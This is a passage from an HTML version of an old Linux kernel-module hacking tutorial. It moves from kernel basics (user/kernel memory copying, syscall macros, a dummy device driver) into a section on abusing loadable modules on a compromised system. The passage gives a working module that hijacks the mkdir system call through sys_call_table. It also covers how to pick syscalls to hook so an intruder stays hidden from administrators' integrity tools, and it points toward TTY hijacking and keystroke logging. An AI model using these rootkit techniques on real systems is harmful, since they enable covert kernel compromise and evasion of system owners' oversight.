                                                                                                        This may sound a bit strange for non-kernel-hackers, but is really easy. Take
                                                                                                        the following systemcall :<br>

                                                                                                        <xmp>
                                                                                                            int sys_chdir (const char *path)
                                                                                                        </xmp>

                                                                                                        Imagine the system calling it, and we intercept that call (we will learn this in
                                                                                                        section II). We want to check the path the user wants to set, so we have to
                                                                                                        access const char *path. If you try to access the path variable directly like

                                                                                                        <xmp>
                                                                                                            printk("<1>%s\n", path);
                                                                                                        </xmp>

                                                                                                        you will get <i>real</i> problems...<br>
                                                                                                        Remember you are in kernel space, you <i>cannot</i> read user space memory easily.
                                                                                                        Well in Phrack 52 you get a solution by plaguez, which is specialized for strings
                                                                                                        He uses a kernel mode function (macro) for retrieving user space memory bytes :

                                                                                                        <xmp>
                                                                                                            #include <asm/segment.h>

                                                                                                            get_user(pointer);
                                                                                                        </xmp>

                                                                                                        Giving this function a pointer to our *path location helps ous getting the bytes
                                                                                                        from user space memory to kernel space. Look at the implemtation made by plaguez
                                                                                                        for moving strings from user to kernel space:<br>

                                                                                                        <xmp>
                                                                                                            char *strncpy_fromfs(char *dest, const char *src, int n)
                                                                                                            {
                                                                                                                char *tmp = src;
                                                                                                                int compt = 0;

                                                                                                                do {
                                                                                                                dest[compt++] = __get_user(tmp++, 1);
                                                                                                            }
                                                                                                                while ((dest[compt - 1] != '\0') && (compt != n));

                                                                                                                return dest;
                                                                                                            }
                                                                                                        </xmp>

                                                                                                        If we want to convert our *path variable we can use the following piece of kernel
                                                                                                        code :

                                                                                                        <xmp>
                                                                                                            char *kernel_space_path;

                                                                                                            kernel_space_path = (char *) kmalloc(100, GFP_KERNEL); /*allocating memory
                                                                                                            in kernel space*/
                                                                                                            (void) strncpy_fromfs(test, path, 20);                 /*calling plaguez's
                                                                                                            function*/
                                                                                                            printk("<1>%s\n", kernel_space_path);                  /*now we can use
                                                                                                            the data for whatever we
                                                                                                            want*/
                                                                                                            kfree(test);                                           /*remember freeing the
                                                                                                            memory*/
                                                                                                        </xmp>

                                                                                                        The code above works very fine. For a general transition it is too complicated;
                                                                                                        plaguez used it only for strings (the functions is made only for string copies).
                                                                                                        For normal data transitions the following function is the easiest way of doing:

                                                                                                        <xmp>
                                                                                                            #include <asm/segment.h>
                                                                                                            void memcpy_fromfs(void *to, const void *from, unsigned long count);
                                                                                                        </xmp>


                                                                                                        Both functions are obviously based on the same kind of commands, but the second
                                                                                                        one is nearly the same as plaguez's newly defined function. I would recommand
                                                                                                        using memcpy_fromfs(...) for general data transitions and plaguez's one for
                                                                                                        string copying tasks.<br>
                                                                                                        Now we know how to convert <i>from</i> user space memory <i>to</i> kernel space. But what
                                                                                                        about the other direction ? This is a bit harder, because we cannot easily
                                                                                                        allocate user space memory from our kernel space position. If we could manage this
                                                                                                        problem we could use<br>

                                                                                                        <xmp>
                                                                                                            #include <asm/segment.h>
                                                                                                            void memcpy_tofs(void *to, const void *from, unsigned long count);
                                                                                                        </xmp>

                                                                                                        doing the actual converting. But how to allocate user space for the *to pointer?
                                                                                                        plaguez's Phrack essay gives us the best solution :

                                                                                                        <xmp>
                                                                                                            /*we need brk systemcall*/
                                                                                                            static inline _syscall1(int, brk, void *, end_data_segment);

                                                                                                            ...

                                                                                                            int ret, tmp;
                                                                                                            char *truc = OLDEXEC;
                                                                                                            char *nouveau = NEWEXEC;
                                                                                                            unsigned long mmm;

                                                                                                            mmm = current->mm->brk;
                                                                                                            ret = brk((void *) (mmm + 256));
                                                                                                            if (ret < 0)
                                                                                                            return ret;
                                                                                                            memcpy_tofs((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
                                                                                                        </xmp>

                                                                                                        This is a very nice trick used here. current is a pointer to the task structure
                                                                                                        of the current process; mm is the pointer to the mm_struct - responsible for
                                                                                                        the memory management of that process. By using the brk-systemcall on current->
                                                                                                        mm->brk we are able to increase the size of the unused area of the datasegment.
                                                                                                        And as we all know allocating memory is done by playing with the datasegment,
                                                                                                        so by increasing the unused area size, we have allocated some piece of memory
                                                                                                        for the current process. This memory can be used for copying the kernel space
                                                                                                        memory to user space (of the current process).<br>
                                                                                                        You may wonder about the first line from the code above. This line helps us to
                                                                                                        use user space like functions in kernel space.Every user space function provided
                                                                                                        to us (like fork, brk, open, read, write, ...) is represented by a _syscall(...)
                                                                                                        macro. So we can construct the exact syscall-macro for a certain user space
                                                                                                        function (represented by a systemcall); here for brk(...).<br>
                                                                                                        See I.5 for a detailed explanation.

                                                                                                        <H3><A NAME="I.5."></A>5.  Ways to use user space like functions</h3>

                                                                                                        As you saw in I.4 we used a syscall macro for constructing our own brk call,
                                                                                                        which is like the one we know from user space (->brk(2)). The truth about the
                                                                                                        user space library funtions (not all) is that they all are implemented through
                                                                                                        such syscall macros. The following code shows the _syscall1(..) macro used in
                                                                                                        I.4 to construct the brk(..) function (taken from /asm/unistd.h). <br>

                                                                                                        <xmp>
                                                                                                            #define _syscall1(type,name,type1,arg1) \
                                                                                                            type name(type1 arg1) \
                                                                                                            { \
                                                                                                                long __res; \
                                                                                                                __asm__ volatile ("int $0x80" \
                                                                                                                : "=a" (__res) \
                                                                                                                : "0" (__NR_##name),"b" ((long)(arg1))); \
                                                                                                                if (__res >= 0) \
                                                                                                                return (type) __res; \
                                                                                                                errno = -__res; \
                                                                                                                return -1; \
                                                                                                            }
                                                                                                        </xmp>

                                                                                                        You don't need to understand this code in its full function, it just calls
                                                                                                        interrupt 0x80 with the arguments provided by the _syscall1 parameters (-> I.2).
                                                                                                        name stands for the systemcall we need (the name is expanded to __NR_name, which
                                                                                                        is defined in /asm/unistd.h). This way we implemted the brk function. Other
                                                                                                        functions with a different count of arguments are implemented through other
                                                                                                        macros (_syscallX, where X stands for the number of arguments). <br>
                                                                                                        I personally use another way of implementing functions; look at the following
                                                                                                        example :

                                                                                                        <xmp>
                                                                                                            int (*open)(char *, int, int); /*declare a prototype*/

                                                                                                            open = sys_call_table[SYS_open];  /*you can also use __NR_open*/
                                                                                                        </xmp>

                                                                                                        This way you don't need to use any syscall macro, you just use the function
                                                                                                        pointer from the sys_call_table. While searching the web, I found that this
                                                                                                        way of contructing user space like functions is also used in the famous LKM
                                                                                                        infector by SVAT. In my opinion this is the better solution, but test it and
                                                                                                        judge yourself.<br>
                                                                                                        Be careful when supplying arguments for those systemcalls, they need them in
                                                                                                        user space not from your kernel space position. Read I.4 for ways to bring your
                                                                                                        kernel space data to user space memory.<br>
                                                                                                        A very easy way doing this (the best way in my opinion) is playing with the
                                                                                                        needed registers. You have to know that Linux uses segment selectors to
                                                                                                        differentiate between kernel space, user space and so on. Arguments used with
                                                                                                        systemcalls which were issued from user space are somewhere in the data segment
                                                                                                        selector (DS) range. [I did not mention this in I.4,because it fits more in this
                                                                                                        section.]<br>
                                                                                                        DS can be retrieved by using get_ds() from asm/segment.h. So the data used as
                                                                                                        parameters by systemcalls can only be accessed from kernel space if we set
                                                                                                        the segment selector used for the user segment by the kernel to the needed DS
                                                                                                        value. This can be done by using set_fs(...). But be careful,you have to restore
                                                                                                        FS after you accessed the argument of the systemcall. So let's look at a code
                                                                                                        fragment showing something useful :<br>

                                                                                                        <xmp>
                                                                                                            ->filename is in our kernel space; a string we just created, for example

                                                                                                            unsigned long old_fs_value=get_fs();

                                                                                                            set_fs(get_ds);               /*after this we can access the user space data*/
                                                                                                            open(filename, O_CREAT|O_RDWR|O_EXCL, 0640);
                                                                                                            set_fs(old_fs_value);         /*restore fs...*/
                                                                                                        </xmp>

                                                                                                        In my opinion this is the easiet / fastest way of solving the problem, but test
                                                                                                        it yourself (again).<br>
                                                                                                        Remember that the functions I showed till now (brk, open) are all implemented
                                                                                                        through a single systemcall. But there are also groups of user space functions
                                                                                                        which are summarized into one systemcall. Take a look at the listing of
                                                                                                        interesting systemcalls (I.2); the sys_socketcall, for example, implements every
                                                                                                        function concering sockets (creation, closing, sending, receiving,...). So be
                                                                                                        careful when constructing your functions; always take a look at the kernel
                                                                                                        sources.<br>

                                                                                                        <H3><A NAME="I.6."></A>6. List of daily needed Kernelspace Functions</h3>

                                                                                                        I introduced the printk(..) function in the beginning of this text. It is a
                                                                                                        function everyone can use in kernel space, it is a so called kernel function.
                                                                                                        Those functions are made for kernel developers who need complex functions which
                                                                                                        are normally only available through a library function. The following listing
                                                                                                        shows the most important kernel functions we often need :

                                                                                                        <TABLE border=5 width=100%>
                                                                                                        <tr>

                                                                                                            <th>function/macro</th>
                                                                                                            <th>description</th>

                                                                                                            <tr>
                                                                                                                <td>int sprintf
                                                                                                                    (char *buf,
                                                                                                                    const char *fmt,
                                                                                                                    ...);<br>
                                                                                                                        int vsprintf
                                                                                                                        (char *buf,
                                                                                                                        const char *fmt,
                                                                                                                        va_list args);<br></td>
                                                                                                                <td>functions for packing data into strings</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>printk
                                                                                                                    (...)</td>
                                                                                                                <td>the same as printf in user space</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>void *memset
                                                                                                                    (void *s, char c,
                                                                                                                    size_t count);<br>
                                                                                                                        void *memcpy
                                                                                                                        (void *dest, const void
                                                                                                                        *src, size_t count);<br>
                                                                                                                        char *bcopy
                                                                                                                        (const char *src,
                                                                                                                        char *dest, int count);<br>
                                                                                                                        void *memmove
                                                                                                                        (void *dest, const void
                                                                                                                        *src, size_t count);<br>
                                                                                                                        int memcmp
                                                                                                                        (const void *cs,
                                                                                                                        const void *ct, size_t
                                                                                                                        count);<br>
                                                                                                                        void *memscan
                                                                                                                        (void *addr, unsigned char
                                                                                                                        c, size_t size);<br></td>
                                                                                                                <td>memory functions</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>int register_symtab
                                                                                                                    (struct symbol_table
                                                                                                                    *intab);</td>
                                                                                                                <td>see I.1</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>char *strcpy
                                                                                                                    (char *dest, const char
                                                                                                                    *src);<br>
                                                                                                                        char *strncpy
                                                                                                                        (char *dest, const char
                                                                                                                        *src, size_t count);<br>
                                                                                                                        char *strcat
                                                                                                                        (char *dest, const char *src);<br>
                                                                                                                        char *strncat
                                                                                                                        (char *dest, const char
                                                                                                                        *src, size_t count);<br>
                                                                                                                        int strcmp
                                                                                                                        (const char *cs,
                                                                                                                        const char *ct);<br>
                                                                                                                        int strncmp
                                                                                                                        (const char *cs,const
                                                                                                                        char *ct, size_t count);<br>
                                                                                                                        char *strchr
                                                                                                                        (const char *s, char c);<br>
                                                                                                                        size_t strlen
                                                                                                                        (const char *s);<br>
                                                                                                                        size_t strnlen
                                                                                                                        (const char *s,
                                                                                                                        size_t count);<br>
                                                                                                                        size_t strspn
                                                                                                                        (const char *s,
                                                                                                                        const char *accept);<br>
                                                                                                                        char *strpbrk
                                                                                                                        (const char *cs,
                                                                                                                        const char *ct);<br>
                                                                                                                        char *strtok
                                                                                                                        (char *s, const char *ct);<br></td>
                                                                                                                <td>string compare functions etc.</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>unsigned long
                                                                                                                    simple_strtoul
                                                                                                                    (const char *cp,
                                                                                                                    char **endp, unsigned int
                                                                                                                    base);</td>
                                                                                                                <td>converting strings to number</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>get_user_byte
                                                                                                                    (addr);<br>
                                                                                                                        put_user_byte
                                                                                                                        (x, addr);<br>
                                                                                                                        get_user_word
                                                                                                                        (addr);<br>
                                                                                                                        put_user_word
                                                                                                                        (x, addr);<br>
                                                                                                                        get_user_long
                                                                                                                        (addr);<br>
                                                                                                                        put_user_long
                                                                                                                        (x, addr);<br></td>
                                                                                                                <td>functions for accessing user memory</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>suser();<br>
                                                                                                                    fsuser();<br></td>
                                                                                                                <td>checking for SuperUser rights</td>
                                                                                                            </tr>

                                                                                                            <tr>
                                                                                                                <td>int register_chrdev
                                                                                                                    (unsigned int major,
                                                                                                                    const char *name,
                                                                                                                    struct file_o perations
                                                                                                                    *fops);<br>
                                                                                                                        int unregister_chrdev
                                                                                                                        (unsigned int major,
                                                                                                                        const char *name);<br>
                                                                                                                        int register_blkdev
                                                                                                                        (unsigned int major,
                                                                                                                        const char *name,
                                                                                                                        struct file_o perations
                                                                                                                        *fops);<br>
                                                                                                                        int unregister_blkdev
                                                                                                                        (unsigned int major,
                                                                                                                        const char *name);<br></td>
                                                                                                                <td>functions which register device driver<br>
                                                                                                                    ..._chrdev -> character devices<br>
                                                                                                                    ..._blkdev -> block devices<br></td>
                                                                                                            </tr>
                                                                                                        </table>

                                                                                                            Please remember that some of those function may also be made available through
                                                                                                            the method mentoined in I.5. But you should understand, that it is not very
                                                                                                            useful contructing nice user space like functions, when the kernel gives them
                                                                                                            to us for free.<br>
                                                                                                            Later on you will see that these functions (especially string comaprisons) are
                                                                                                            very important for our purposes.<br>


                                                                                                            <H3><A NAME="I.7."></A>7. What is the Kernel-Daemon </h3>

                                                                                                            Finally we nearly reached the end of the basic part. Now I will explain the
                                                                                                            working of the Kernel-Daemon (/sbin/kerneld). As the name suggest this is a
                                                                                                            process in user space waiting for some action. First of all you must know that
                                                                                                            it is necessary to activite the kerneld option while building the kernel, in
                                                                                                            order to use kerneld's features. Kerneld works the following way : If the kernel
                                                                                                            wants to access a resource (in kernel space of course), which is not present
                                                                                                            at that moment, he does <i>not</i> produce an error. Instead of doing this he asks
                                                                                                            kerneld for that resource. If kerneld is able to provide the resource, it loads
                                                                                                            the required LKM and the kernel can continue working. By using this scheme it is
                                                                                                            possible to load and unload LKMs only when they are really needed / not needed.
                                                                                                            It should be clear that this work needs to be done both in user and in kernel
                                                                                                            space.<br>
                                                                                                            Kerneld exists in user space. If the kernel requests a new module this daemon
                                                                                                            receives a string from the kernel telling it which module to load.It is possible
                                                                                                            that the kenel sends a generic name (instead of the name of object file) like
                                                                                                            eth0. In this case the system need to lookup /etc/modules.conf for alias lines.
                                                                                                            Those lines match generic names to the LKM required on that system.<br>
                                                                                                            The following line says that eth0 is represented by a DEC Tulip driver LKM :<br>

                                                                                                            <xmp>
                                                                                                                # /etc/modules.conf          # or /etc/conf.modules - this differs
                                                                                                                alias eth0 tulip
                                                                                                            </xmp>

                                                                                                            This was the user space side represented by the kerneld daemon. The kernel space
                                                                                                            part is mainly represented by 4 functions. These functions are all based on
                                                                                                            a call to kerneld_send. For the exact way kerneld_send is involved by calling
                                                                                                            those functions look at linux/kerneld.h.  The following table lists the 4
                                                                                                            functions mentioned above :<br>

                                                                                                            <TABLE border=5 width=100%>
                                                                                                            <tr>

                                                                                                                <th>function</th>
                                                                                                                <th>description</th>

                                                                                                                <tr>
                                                                                                                    <td>int sprintf
                                                                                                                        (char *buf,
                                                                                                                        const char *fmt,
                                                                                                                        ...);<br>
                                                                                                                            int vsprintf
                                                                                                                            (char *buf,
                                                                                                                            const char *fmt,
                                                                                                                            va_list args);<br></td>
                                                                                                                    <td>functions for packing data into strings</td>
                                                                                                                </tr>

                                                                                                                <tr>
                                                                                                                    <td>int request_module
                                                                                                                        (const char *name);</td>
                                                                                                                    <td>says kerneld that the kernel requires a certain module (given a name or gerneric ID / name)<td>
                                                                                                                        <tr>

                                                                                                                            <tr>
                                                                                                                                <td>int release_module
                                                                                                                                    (const char* name,
                                                                                                                                    int waitflag);</td>
                                                                                                                                <td>unload a module</td>
                                                                                                                                <tr>

                                                                                                                                    <tr>
                                                                                                                                        <td>int delayed_release_module
                                                                                                                                            (const char *name);</td>
                                                                                                                                        <td>delayed unload</td>
                                                                                                                                        <tr>

                                                                                                                                            <tr>
                                                                                                                                                <td>int cancel_release_module
                                                                                                                                                    (const char *name);</td>
                                                                                                                                                <td>cancels a call of delayed_release_module</td>
                                                                                                                                                <tr>
                                                                                                                                                </table>
                                                                                                                                                <i>Note</i> : Kernel 2.2 uses another scheme for requesting modules. Take a look at part
                                                                                                                                                V.

                                                                                                                                                <H3><A NAME="I.8."></A>8. Creating your own Devices</h3>

                                                                                                                                                Appendix A introduces a TTY Hijacking util, which will use a device to log its
                                                                                                                                                results. So we have to look at a very basic example of a device driver.
                                                                                                                                                Look at the following code (this is a very basic driver, I just wrote it for
                                                                                                                                                demonstration, it does implement nearly no operations...) :<br>

                                                                                                                                                <xmp>
                                                                                                                                                    #define MODULE
                                                                                                                                                    #define __KERNEL__

                                                                                                                                                    #include <linux/module.h>
                                                                                                                                                    #include <linux/kernel.h>
                                                                                                                                                    #include <asm/unistd.h>
                                                                                                                                                    #include <sys/syscall.h>
                                                                                                                                                    #include <sys/types.h>
                                                                                                                                                    #include <asm/fcntl.h>
                                                                                                                                                    #include <asm/errno.h>
                                                                                                                                                    #include <linux/types.h>
                                                                                                                                                    #include <linux/dirent.h>
                                                                                                                                                    #include <sys/mman.h>
                                                                                                                                                    #include <linux/string.h>
                                                                                                                                                    #include <linux/fs.h>
                                                                                                                                                    #include <linux/malloc.h>

                                                                                                                                                    /*just a dummy for demonstration*/
                                                                                                                                                    static int driver_open(struct inode *i, struct file *f)
                                                                                                                                                    {
                                                                                                                                                        printk("<1>Open Function\n");
                                                                                                                                                        return 0;
                                                                                                                                                    }

                                                                                                                                                    /*register every function which will be provided by our driver*/
                                                                                                                                                    static struct file_operations fops = {
                                                                                                                                                    NULL,                 /*lseek*/
                                                                                                                                                    NULL,                 /*read*/
                                                                                                                                                    NULL,                 /*write*/
                                                                                                                                                    NULL,                 /*readdir*/
                                                                                                                                                    NULL,                 /*select*/
                                                                                                                                                    NULL,                 /*ioctl*/
                                                                                                                                                    NULL,                 /*mmap*/
                                                                                                                                                    driver_open,          /*open, take a look at my dummy open function*/
                                                                                                                                                    NULL,                 /*release*/
                                                                                                                                                    NULL                  /*fsync...*/
                                                                                                                                                };


                                                                                                                                                    int init_module(void)
                                                                                                                                                    {
                                                                                                                                                        /*register driver with major 40 and the name driver*/
                                                                                                                                                        if(register_chrdev(40, "driver", &fops)) return -EIO;
                                                                                                                                                        return 0;
                                                                                                                                                    }

                                                                                                                                                    void cleanup_module(void)
                                                                                                                                                    {
                                                                                                                                                        /*unregister our driver*/
                                                                                                                                                        unregister_chrdev(40, "driver");
                                                                                                                                                    }
                                                                                                                                                </xmp>
                                                                                                                                                The most important important function is register_chrdev(...) which registers
                                                                                                                                                our driver with the major number 40. If you want to access this driver,do the
                                                                                                                                                following :

                                                                                                                                                <xmp>
                                                                                                                                                    # mknode /dev/driver c 40 0

                                                                                                                                                    # insmod driver.o
                                                                                                                                                </xmp>

                                                                                                                                                After this you can access that device (but i did not implement any functions due
                                                                                                                                                to lack of time...). The file_operations structure provides every function
                                                                                                                                                (operation) which our driver will provide to the system. As you can see I did
                                                                                                                                                only implement a very (!) basic dummy function just printing something.
                                                                                                                                                It should be clear that you can implement your own devices in a very easy way
                                                                                                                                                by using the methods above. Just do some experiments. If you log some data (key
                                                                                                                                                strokes, for example) you can build a buffer in your driver that exports its
                                                                                                                                                contents through the device interface).



                                                                                                                                                <u><b>
                                                                                                                                                    <H2>II. Fun & Profit</H2>
                                                                                                                                                </u></b>
                                                                                                                                                <P><P>


                                                                                                                                                    <H3><A NAME="II.1."></A>1. How to intercept Syscalls</h3>

                                                                                                                                                    Now we start abusing the LKM scheme. Normally LKMs are used to extend the kernel
                                                                                                                                                    (especially hardware drivers). Our 'Hacks' will do something different, they
                                                                                                                                                    will intercept systemcalls and modify them in order to change the way the system
                                                                                                                                                    reacts on certain commands.<br>
                                                                                                                                                    The following module makes it impossible for any user on the compromised system
                                                                                                                                                    to create directories. This is just a little demonstration to show the way we
                                                                                                                                                    follow.<br>

                                                                                                                                                    <xmp>
                                                                                                                                                        #define MODULE
                                                                                                                                                        #define __KERNEL__

                                                                                                                                                        #include <linux/module.h>
                                                                                                                                                        #include <linux/kernel.h>
                                                                                                                                                        #include <asm/unistd.h>
                                                                                                                                                        #include <sys/syscall.h>
                                                                                                                                                        #include <sys/types.h>
                                                                                                                                                        #include <asm/fcntl.h>
                                                                                                                                                        #include <asm/errno.h>
                                                                                                                                                        #include <linux/types.h>
                                                                                                                                                        #include <linux/dirent.h>
                                                                                                                                                        #include <sys/mman.h>
                                                                                                                                                        #include <linux/string.h>
                                                                                                                                                        #include <linux/fs.h>
                                                                                                                                                        #include <linux/malloc.h>

                                                                                                                                                        extern void* sys_call_table[];       /*sys_call_table is exported, so we
                                                                                                                                                        can access it*/

                                                                                                                                                        int (*orig_mkdir)(const char *path); /*the original systemcall*/


                                                                                                                                                        int hacked_mkdir(const char *path)
                                                                                                                                                        {
                                                                                                                                                            return 0;                           /*everything is ok, but he new systemcall
                                     does nothing*/
                                                                                                                                                        }

                                                                                                                                                        int init_module(void)                /*module setup*/
                                                                                                                                                        {
                                                                                                                                                            orig_mkdir=sys_call_table[SYS_mkdir];
                                                                                                                                                            sys_call_table[SYS_mkdir]=hacked_mkdir;
                                                                                                                                                            return 0;
                                                                                                                                                        }

                                                                                                                                                        void cleanup_module(void)            /*module shutdown*/
                                                                                                                                                        {
                                                                                                                                                            sys_call_table[SYS_mkdir]=orig_mkdir; /*set mkdir syscall to the origal
                                       one*/
                                                                                                                                                        }
                                                                                                                                                    </xmp>

                                                                                                                                                    Compile this module and start it (see I.1). Try to make a directory, it will
                                                                                                                                                    not work.Because of returning 0 (standing for OK) we don't get an error message.
                                                                                                                                                    After removing the module making directories is possible again.
                                                                                                                                                    As you can see, we only need to change the corresponding entry in sys_call_table
                                                                                                                                                    (see I.2) for intercepting a kernel systemcall.<br>
                                                                                                                                                    The general approach to intercepting a systemcall is outlined in the following
                                                                                                                                                    list :<br>
                                                                                                                                                    <ul>

                                                                                                                                                        <li> find your systemcall entry in sys_call_table[] (take a look at include/sys/
                                                                                                                                                            syscall.h)<br>
                                                                                                                                                                <li> save the old entry of sys_call_table[X] in a function pointer (where X stands
                                                                                                                                                                    for the systemcallnumber you want to intercept)<br>
                                                                                                                                                                        <li> save the address of the new (hacked) systemcall you defined yourself by
                                                                                                                                                                            setting sys_call_table[X] to the needed function address<br>
                                                                                                                                                    </ul>

                                                                                                                                                    You will recognize that it is very useful to save the old systemcall function
                                                                                                                                                    pointer, because you will need it in your hacked one for emulating the original
                                                                                                                                                    call.  The first question you have to face when writing a 'Hack-LKM  ' is : <br>
                                                                                                                                                    <i>'Which systemcall should I intercept'.</i><br>

                                                                                                                                                    <H3><A NAME="II.2."></A>2. Interesting Syscalls to Intercept</h3>
                                                                                                                                                    Perhaps you are not a 'kernel god' and you don't know every systemcall for every
                                                                                                                                                    user space function an application or command can use. So I will give you some
                                                                                                                                                    hints on finding your systemcalls to take control over.<br>
                                                                                                                                                    <ol type="a">
                                                                                                                                                        <li>read source code. On systems like Linux you can have the source code on
                                                                                                                                                            nearly any program a user (admin) can use. Once you have found a basic
                                                                                                                                                            function like dup, open, write, ... go to b<br>
                                                                                                                                                                <li>take a look at include/sys/syscall.h (see I.2). Try to find a directly
                                                                                                                                                                    corresponding systemcall (search for dup -> you will find SYS_dup; search
                                                                                                                                                                    for write -> you will find SYS_write; ...). If this does not work got to c<br>
                                                                                                                                                                        <li>some calls like socket, send, receive, ... are implemented through one
                                                                                                                                                                            systemcall - as I said before. Take a look at the include file mentioned
                                                                                                                                                                            for related systemcalls.<br>
                                                                                                                                                    </ol>

                                                                                                                                                    Remember not every C-lib function is a systemcall ! Most functions are totally
                                                                                                                                                    unrelated to any systemcalls !<br>
                                                                                                                                                    A little more experienced hackers should take a look at the systemcall listing
                                                                                                                                                    in I.2 which provides enough information. It should be clear that User ID management
                                                                                                                                                    is implemented through the uid-systemcalls etc. If you really want to be sure
                                                                                                                                                    you can also take a look at the library sources / kernel sources.<br>
                                                                                                                                                    The hardest problem is an admin writing its own applications for checking system
                                                                                                                                                    integrity / security. The problem concerning those programs is the lack of source
                                                                                                                                                    code. We cannot say how this program exactly works and which systemcalls we have
                                                                                                                                                    to intercept in order to hide our presents / tools. It may even be possible that
                                                                                                                                                    he introduced a LKM hiding itself which implements cool hacker-like systemcalls
                                                                                                                                                    for checking the system security (the admins often use hacker techniques to defend
                                                                                                                                                    their system...). So how do we proceed.<br>

                                                                                                                                                    <H4><A NAME="II.2.1."></A>2.1  Finding interesting systemcalls (the strace approach)</h4>

                                                                                                                                                    Let's say you know the super-admin program used to check the system (this can
                                                                                                                                                    be done in some ways,like TTY hijacking (see II.9 / Appendix A), the only problem
                                                                                                                                                    is that you need to hide your presents from the super-admin program until that
                                                                                                                                                    point..).<br>
                                                                                                                                                    So run the program (perhaps you have to be root to execute it) using strace.

                                                                                                                                                    <xmp>
                                                                                                                                                        # strace super_admin_proggy
                                                                                                                                                    </xmp>

                                                                                                                                                    This will give you a really nice output of every systemcall made by that program
                                                                                                                                                    including the systemcalls which may be added by the admin through his hacking
                                                                                                                                                    LKM (could be possible). I don't have a super-admin-proggy for showing you a
                                                                                                                                                    sample output, but take a look at the output of 'strace whoami' :<vr>

                                                                                                                                                    <xmp>
                                                                                                                                                        execve("/usr/bin/whoami", ["whoami"], [/* 50 vars */]) = 0
                                                                                                                                                        mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40007000
                                                                                                                                                        mprotect(0x40000000, 20673, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
                                                                                                                                                        mprotect(0x8048000, 6324, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
                                                                                                                                                        stat("/etc/ld.so.cache", {st_mode=S_IFREG|0644, st_size=13363, ...}) = 0
                                                                                                                                                        open("/etc/ld.so.cache", O_RDONLY)      = 3
                                                                                                                                                        mmap(0, 13363, PROT_READ, MAP_SHARED, 3, 0) = 0x40008000
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        stat("/etc/ld.so.preload", 0xbffff780)  = -1 ENOENT (No such file or directory)
                                                                                                                                                        open("/lib/libc.so.5", O_RDONLY)        = 3
                                                                                                                                                        read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
                                                                                                                                                        mmap(0, 761856, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000c000
                                                                                                                                                        mmap(0x4000c000, 530945, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED, 3, 0) = 0x4000c000
                                                                                                                                                        mmap(0x4008e000, 21648, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x81000) = 0x4008e000
                                                                                                                                                        mmap(0x40094000, 204536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x40094000
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        mprotect(0x4000c000, 530945, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
                                                                                                                                                        munmap(0x40008000, 13363)               = 0
                                                                                                                                                        mprotect(0x8048000, 6324, PROT_READ|PROT_EXEC) = 0
                                                                                                                                                        mprotect(0x4000c000, 530945, PROT_READ|PROT_EXEC) = 0
                                                                                                                                                        mprotect(0x40000000, 20673, PROT_READ|PROT_EXEC) = 0
                                                                                                                                                        personality(PER_LINUX)                  = 0
                                                                                                                                                        geteuid()                               = 500
                                                                                                                                                        getuid()                                = 500
                                                                                                                                                        getgid()                                = 100
                                                                                                                                                        getegid()                               = 100
                                                                                                                                                        brk(0x804aa48)                          = 0x804aa48
                                                                                                                                                        brk(0x804b000)                          = 0x804b000
                                                                                                                                                        open("/usr/share/locale/locale.alias", O_RDONLY) = 3
                                                                                                                                                        fstat(3, {st_mode=S_IFREG|0644, st_size=2005, ...}) = 0
                                                                                                                                                        mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40008000
                                                                                                                                                        read(3, "# Locale name alias data base\n#"..., 4096) = 2005
                                                                                                                                                        brk(0x804c000)                          = 0x804c000
                                                                                                                                                        read(3, "", 4096)                       = 0
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        munmap(0x40008000, 4096)                = 0
                                                                                                                                                        open("/usr/share/i18n/locale.alias", O_RDONLY) = -1 ENOENT (No such file or directory)
                                                                                                                                                        open("/usr/share/locale/de_DE/LC_CTYPE", O_RDONLY) = 3
                                                                                                                                                        fstat(3, {st_mode=S_IFREG|0644, st_size=10399, ...}) = 0
                                                                                                                                                        mmap(0, 10399, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40008000
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        geteuid()                               = 500
                                                                                                                                                        open("/etc/passwd", O_RDONLY)           = 3
                                                                                                                                                        fstat(3, {st_mode=S_IFREG|0644, st_size=1074, ...}) = 0
                                                                                                                                                        mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000b000
                                                                                                                                                        read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1074
                                                                                                                                                        close(3)                                = 0
                                                                                                                                                        munmap(0x4000b000, 4096)                = 0
                                                                                                                                                        fstat(1, {st_mode=S_IFREG|0644, st_size=2798, ...}) = 0
                                                                                                                                                        mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000b000
                                                                                                                                                        write(1, "r00t\n", 5r00t
                                                                                                                                                        )                   = 5
                                                                                                                                                        _exit(0)                                = ?
                                                                                                                                                    </xmp>

                                                                                                                                                    This is a very nice listing of all systamcalls made by the command 'whoami',
                                                                                                                                                    isn't it ? There are  4 interesting systemcalls to intercept in order to
                                                                                                                                                    manipulate the output of 'whoami'

                                                                                                                                                    <xmp>
                                                                                                                                                        geteuid()                               = 500
                                                                                                                                                        getuid()                                = 500
